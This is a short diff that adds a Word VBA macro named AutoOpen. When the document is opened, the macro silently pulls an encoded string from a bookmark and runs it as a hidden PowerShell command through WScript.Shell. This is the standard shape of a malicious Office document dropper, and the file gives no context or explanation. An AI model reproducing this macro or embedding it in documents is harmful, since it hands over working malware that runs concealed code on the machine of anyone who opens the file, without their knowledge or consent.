@@ -1,0 +1,14 @@
+Sub AutoOpen()
+
+    Dim var As String 
+    Dim ws As Object  
+    
+    var = ActiveDocument.Bookmarks("aBOOKMARKa").Range.Text
+
+    Set ws = CreateObject("WScript.Shell")
+    
+    cmd = "powershell.exe -nop -WindowStyle hidden -encodedCommand " + var
+    ws.Exec(cmd)
+
+
+End Sub
